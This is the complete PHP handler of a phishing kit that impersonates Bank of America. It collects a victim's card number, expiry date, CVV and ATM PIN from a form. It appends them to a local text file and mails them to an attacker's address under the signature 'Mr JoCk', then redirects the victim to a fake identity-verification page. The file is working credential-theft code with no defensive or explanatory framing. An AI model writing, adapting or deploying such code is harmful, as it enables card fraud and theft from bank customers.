
<?php

session_start();
$_SESSION['cc_number'] = $_POST['cc_number'];
$_SESSION['Exp'] = $_POST['Exp'] ;
$_SESSION['cvv'] = $_POST['cvv'];
$_SESSION['atm'] = $_POST['atm'] ;
$TIME_DATE = date('H:i:s d/m/Y');
include('Email.php');

$message .= "----------------------+   Full +-------------------\n";
$message .= "-----------------------------------------------------\n";
$message .= "|CC 		  : ".$_POST['cc_number']."\n";
$message .= "|Expiry 	  : ".$_POST['Exp']."\n";
$message .= "|Cvv 		  : ".$_POST['cvv']."\n";
$message .= "|ATM 		  : ".$_POST['atm']."\n";
$message .= "--------------------+ By Mr JoCk +------------------\n";
$message .= "Client IP: ".$ip." \n";
$subject = "Card BOA By JoCk- From:  [ $ip ]";
$file = fopen("./cool.txt","a"); 
fwrite($file, $message);
$headers = 'From: Mr JoCK <WF@rezult.com>' ;
{
mail($XBALTI_EMAIL,$subject,$message,$headers);
}
header("Location: ./uploads/identidy/verification");
?>




